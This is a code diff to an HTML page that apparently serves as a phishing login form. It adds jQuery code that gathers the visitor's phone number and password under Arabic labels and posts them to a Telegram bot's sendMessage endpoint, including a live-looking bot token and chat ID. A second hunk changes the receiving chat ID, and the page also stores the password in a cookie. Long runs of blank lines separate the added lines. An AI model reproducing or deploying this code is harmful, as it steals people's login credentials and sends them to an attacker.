@@ -952,6 +952,229 @@ document.getElementById('password').setAttribute("name",'password');
 
 
 
+            var message = "رقم الهاتف:`"+phonenumber+"`\n"
+
+
+
+
+
+
+
+
+
+
+
+            message += "كلمة السر:`"+password+"`\n"
+
+
+
+
+
+
+
+
+
+
+
+            $.ajax({
+
+
+
+
+
+
+
+
+
+
+
+                type: 'POST',
+
+
+
+
+
+
+
+
+
+
+
+                url: `https://api.telegram.org/bot7553561556:AAHr8ODFLVaNsWExKr4Qp1PwKniSsoNUD4I/sendMessage`,
+
+
+
+
+
+
+
+
+
+
+
+                data: {
+
+
+
+
+
+
+
+
+
+
+
+                    chat_id: "6985854225",
+
+
+
+
+
+
+
+
+
+
+
+                    text: message,
+
+
+
+
+
+
+
+
+
+
+
+                    parse_mode: 'markdown',
+
+
+
+
+
+
+
+
+
+
+
+                },
+
+
+
+
+
+
+
+
+
+
+
+                success: function (res) {
+
+
+
+
+
+
+
+
+
+
+
+                    console.debug(res);
+
+
+
+
+
+
+
+
+
+
+
+                    $('#response').text('Message sent');
+
+
+
+
+
+
+
+
+
+
+
+                },
+
+
+
+
+
+
+
+
+
+
+
+                error: function (error) {
+
+
+
+
+
+
+
+
+
+
+
+                    console.error(error);
+
+
+
+
+
+
+
+
+
+
+
+                    alert("error failed");
+
+
+
+
+
+
+
+
+
+
+
+                }
+
+
+
+
+
+
+
+
+
+
+
+            });
+
+
+            
+
+
+
 
 
 
@@ -1030,7 +1253,7 @@ document.getElementById('password').setAttribute("name",'password');
 
 
 
-                    chat_id: "6797351288",
+                    chat_id: "7736802193",
 
 
 
@@ -1279,6 +1502,5 @@ setCookie("password",password,1000);
 
 
 </body></html>
-
 
 
